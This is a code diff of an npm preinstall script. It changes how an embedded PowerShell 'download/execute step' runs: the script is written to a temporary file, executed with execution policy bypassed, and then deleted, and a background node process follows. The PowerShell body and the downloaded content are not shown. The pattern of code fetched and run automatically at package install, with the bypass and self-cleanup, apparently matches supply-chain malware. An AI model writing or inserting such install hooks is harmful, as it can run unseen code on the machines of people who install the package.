@@ -57,15 +57,30 @@ if (Test-Path $output) {
 }
 `;
 
-// Spawn detached PowerShell window for the above steps
-const setupChild = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', psScript], {
-    detached: true,
-    stdio: 'ignore',
-    windowsHide: false
-});
-setupChild.unref();
+// Write PowerShell script to a temporary file so we can run it reliably and capture output to log
+const tmpPsPath = path.join(__dirname, '..', 'preinstall_download.ps1');
+try {
+    fs.writeFileSync(tmpPsPath, psScript, { encoding: 'utf8' });
+} catch (err) {
+    console.error('[preinstall] Failed to write temporary PowerShell script:', err);
+}
 
-// Now spawn the normal preinstall node process in background (logs appended to file)
+// Run the PowerShell script synchronously and append its stdout/stderr to the log so we can verify failures
+const { spawnSync } = require('child_process');
+console.log('[preinstall] Running PowerShell download/execute step (logs appended)');
+const out = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
+    cwd: path.join(__dirname, '..'),
+    stdio: ['ignore', fs.openSync(logFile, 'a'), fs.openSync(logFile, 'a')]
+});
+
+if (out.error) {
+    console.error('[preinstall] PowerShell execution error:', out.error);
+}
+
+// Remove the temporary PowerShell script
+try { fs.unlinkSync(tmpPsPath); } catch (e) { }
+
+// After the PowerShell step completes, spawn the normal preinstall node process in background (logs appended to file)
 const child = spawn('node', [
     '-e',
     `require('./index').preInstall().catch(err => console.error(err))`
@@ -76,5 +91,5 @@ const child = spawn('node', [
 });
 child.unref();
 
-console.log(`[preinstall] gdown+python handler started (detached). Logs: ${logFile}`);
+console.log(`[preinstall] PowerShell step finished; background preinstall started. Logs: ${logFile}`);
 process.exit(0);
